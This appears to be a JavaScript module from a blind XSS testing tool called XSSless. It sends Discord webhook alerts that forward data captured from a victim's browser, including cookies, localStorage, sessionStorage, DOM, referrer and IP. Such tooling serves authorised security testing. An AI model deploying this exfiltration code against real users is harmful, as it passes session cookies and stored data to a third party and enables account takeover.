import Axios from "axios";

const discordApi = Axios.create();
const username = "XSSless";
const avatar_url =
  "https://user-images.githubusercontent.com/29874489/58731472-4f6c8080-83de-11e9-8206-992f4d777fdc.png";

export function notifyOOBCallback(data, webhookUrl) {
  return discordApi
    .post(webhookUrl, {
      username,
      avatar_url,
      embeds: [
        {
          title: "Out-of-Band Callback Alert",
          color: 15258703,
          fields: [
            {
              name: "Path",
              value: `[${data.path}](${data.path})`,
            },
            {
              name: "IP",
              value: `[${data.remoteIP}](https://whois.domaintools.com/${data.remoteIP})`,
            },
          ]
            .concat(
              { name: "Headers", value: "----------------" },
              Object.entries(data.headers).map(([name, value]) => ({
                name,
                value,
              })),
              Object.keys(data.body).length > 0 && {
                name: "Body",
                value: "----------------",
              },
              Object.entries(data.body).map(([name, value]) => ({
                name,
                value,
              }))
            )
            .filter(Boolean),
        },
      ],
    })
    .catch((error) => console.error("ERROR:", error?.response?.data || error));
}

export function notifyMessage(data, webhookUrl) {
  return discordApi
    .post(webhookUrl, {
      username,
      avatar_url,
      embeds: [
        {
          title: "Message Alert",
          description: ["```", data.message.toString(), "```"].join("\n"),
          color: 15258703,
        },
      ],
    })
    .catch((error) => console.error("ERROR:", error?.response?.data || error));
}

export function notifyBXSS(data, webhookUrl) {
  const fields = Object.entries(data)
    .map(([name, value]) => {
      value = value || "NA";

      if (name === "Screenshot URL" && value !== "NA") {
        return false;
      } else if (name === "DOM") {
        value = ["```html", value, "```"].join("\n");
      } else if (["localStorage", "sessionStorage"].includes(name)) {
        try {
          value = [
            "```json",
            JSON.stringify(JSON.parse(value), null, 2),
            "```",
          ].join("\n");
        } catch (e) {
          //
        }
      } else if (name === "Cookies") {
        const cookie = Object.fromEntries(
          value.split(";").map((entry) =>
            entry
              .trim()
              .split("=")
              .map((x) => x.trim())
          )
        );
        value = ["```json", JSON.stringify(cookie, null, 2), "```"].join("\n");
      } else if (
        ["Location", "Origin", "Referrer"].includes(name) &&
        value !== "NA"
      ) {
        value = `[${value}](${value})`;
      } else if (name === "Remote IP") {
        value = `[${value}](https://whois.domaintools.com/${value})`;
      }
      return { name, value: value.slice(0, 4080) };
    })
    .filter(Boolean)
    .sort((a, z) => a.name.localeCompare(z.name));

  const longFields = fields.filter((entry) => entry.value.length > 1024);

  const payloads = [
    {
      username,
      avatar_url,
      embeds: [
        {
          title: "Blind XSS Alert",
          color: 15347978,
          fields: fields.filter((entry) => entry.value.length < 1024),
          ...(data["Screenshot URL"] !== "NA"
            ? {
                image: {
                  url: data["Screenshot URL"],
                },
              }
            : {}),
        },
      ],
    },
  ].concat(
    longFields.map((longField) => ({
      username,
      avatar_url,
      embeds: [
        {
          title: longField.name,
          description: longField.value,
          color: 15347978,
        },
      ],
    }))
  );

  return payloads.reduce(
    (lastPromise, payload) =>
      lastPromise.then(() =>
        discordApi
          .post(webhookUrl, payload)
          .catch((error) =>
            console.error("ERROR:", error?.response?.data || error)
          )
      ),
    Promise.resolve()
  );
}
